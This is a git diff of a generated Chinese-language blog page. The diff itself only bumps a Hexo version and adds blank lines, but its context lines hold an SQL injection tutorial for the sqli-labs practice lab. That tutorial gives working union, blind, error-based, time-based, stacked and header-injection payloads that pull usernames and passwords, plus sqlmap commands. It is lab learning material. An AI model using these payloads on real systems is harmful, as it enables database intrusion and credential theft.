@@ -29,7 +29,7 @@
 
     <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
 
@@ -405,6 +405,7 @@ database(): 查看数据库名
 user(): 查看mysql用户
 limit m,n: 从m条记录开始取n条记录
 ......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="构造闭合语句"><a href="#构造闭合语句" class="headerlink" title="构造闭合语句"></a>构造闭合语句</h3><p>sql注入需要将前面的语句闭合起来或者是形成自己的sql语句,可以有一下几种方式:</p>
 <p>‘ (单引号)可以把id括起来，使前面的语句闭合</p>
 <p>构造语句的时候，一是要把我们构造的语句释放出来，二是要把结构进行补全或者适当的注释。</p>
@@ -426,27 +427,33 @@ limit m,n: 从m条记录开始取n条记录
 "))or 1=1--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
+
 <h3 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h3><h4 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h4><p>感觉思路是比较清晰的，一步一步的扩大对数据库的查询范围，最后获取到有用信息。就是order by查字段有点烦</p>
 <p>一般的union注入感觉都可以安装这个步骤来：</p>
 <p>1.先找到闭合规则</p>
 <p>2.然后用order by子句查询属性列的字段数,也就是看有多少列</p>
 <p>3.接着就可以获取database()了，先把id换成-1，数据库没有id=-1的数据，这样就可以把所有select起来的数据都显示出来</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>可以看到当前的数据库是security</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201220521.png" alt="image-20210208201220521"></p>
 <p>4.查表名</p>
 <p>因为当时union select出来的数据显示2，3</p>
 <p>所以可以在原来2，3的位置插入sql语句，但要用（）将要插入的sql语句包起来</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema ='security'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>5.查用户属性也就是字段</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>可以发现有三个属性</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201234242.png" alt="image-20210208201234242"></p>
 <p>6.查完属性就可以查列了，把username全部调出来</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201319502.png" alt="image-20210208201319502"></p>
 <p>7.最后就是查用户密码了</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>感觉这个全靠猜，但是猜也得讲究技巧呀，比如可以用数据结构学过的二分法去搞</p>
 <p>1.先判断是不是Boolean盲注，如果能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，Boolean顾名思义只存在两种状态，对或错，你看不到任何信息，只有true or false</p>
 <p>比如这题，猜对了只有You are in 显示，猜错了就啥也没有</p>
@@ -456,6 +463,7 @@ http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=2 --+ 正常
 http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=2 --+ 不正常
 http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=1 --+ 正常
 综上可以判断是字符串盲注了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>2.根据返回状态判断闭合规则</p>
 <p>3.<strong>经常用到的就是length()和substr()语句，来猜数据库、表名等的长度和正确字母；</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">length()：返回字符串的长度
@@ -463,15 +471,18 @@ substr(str,pos,num) ：截取指定位置指定长度的字符串
 mid(str,pos,num) :截取指定位置指定长度的字符串
 ascii() 查询ascii码中对应的值
 char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ol>
 <li><p>只要注入点有sql报错信息，就可以使用报错注入；</p>
 </li>
 <li><p>还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；</p>
 </li>
 <li><p>updatexml报错获取当前数据库：</p>
-<pre class="line-numbers language-none"><code class="language-none">and updatexml(1,concat(0x7e,(select database()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<pre class="line-numbers language-none"><code class="language-none">and updatexml(1,concat(0x7e,(select database()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
 <li><p>floor报错获取当前数据库：</p>
-<pre class="line-numbers language-none"><code class="language-none">and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<pre class="line-numbers language-none"><code class="language-none">and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
 <li><p>两种方式应该都可行，如果第一个不行就换第二个试试</p>
 </li>
 <li><p>接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；</p>
@@ -492,11 +503,14 @@ char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers
 </li>
 <li><p>那么判断当前数据库名的长度的语句为：</p>
 <pre class="line-numbers language-none"><code class="language-none">if (length(database())&gt;1,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是没有延时)，由此来推出数据库长度。</p>
 </li>
 <li><p>判断当前数据库名的第一个和第二个字母的语句：</p>
 <pre class="line-numbers language-none"><code class="language-none">if(substr(database(),1,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <pre class="line-numbers language-none"><code class="language-none">if(substr(database(),2,1)='s',sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。</p>
 </li>
 <li><p>根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。</p>
@@ -509,7 +523,8 @@ char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers
 </li>
 <li><p>堆叠注入的语句为</p>
 <pre class="line-numbers language-none"><code class="language-none">;select if(length(database())&gt;1,sleep(3),1)
-;select if(substr(database(),1,1)='r',sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+;select if(substr(database(),1,1)='r',sleep(3),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
 <li><p>按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。</p>
 </li>
 </ol>
@@ -539,7 +554,8 @@ char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers
 <li><p>抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；</p>
 </li>
 <li><p>常见的http头部注入的参数有：</p>
-<pre class="line-numbers language-none"><code class="language-none">【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<pre class="line-numbers language-none"><code class="language-none">【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
 <li><p>如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；</p>
 </li>
 <li><p>和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</p>
@@ -578,9 +594,11 @@ char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers
 4：同时显示 HTTP 请求；
 5：同时显示 HTTP 响应头；
 6：同时显示 HTTP 响应体。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h4 id="2-指定目标-U"><a href="#2-指定目标-U" class="headerlink" title="2.指定目标 U"></a>2.指定目标 <code>U</code></h4><p>使用参数 <code>-u</code> 或 <code>–url</code> 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "www.baidu.com/user.php?id=7"
 sqlmap.py -url "www.baidu.com:8080/user.php?id=7"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <h4 id="3-列库-dbs"><a href="#3-列库-dbs" class="headerlink" title="3. 列库 dbs"></a>3. 列库 <code>dbs</code></h4><p>在检测出了存在注入后，就要进行对数据库的列举，命令是 <code>--dbs</code></p>
 <h4 id="4-列表-tables"><a href="#4-列表-tables" class="headerlink" title="4. 列表 tables"></a>4. 列表 <code>tables</code></h4><p>在列出了 Web 程序的库后，要根据这个库来列出表，命令是 <code>-D ‘库名’ --tables</code></p>
 <h4 id="5-列出表中字段-columns"><a href="#5-列出表中字段-columns" class="headerlink" title="5. 列出表中字段 columns"></a>5. 列出表中字段 <code>columns</code></h4><p>得到了库和表之后，可以根据这个库表来列出表里的字段进行数据的读取，命令是 <code>-D ‘库名’ -T ‘表名’ --columns</code></p>
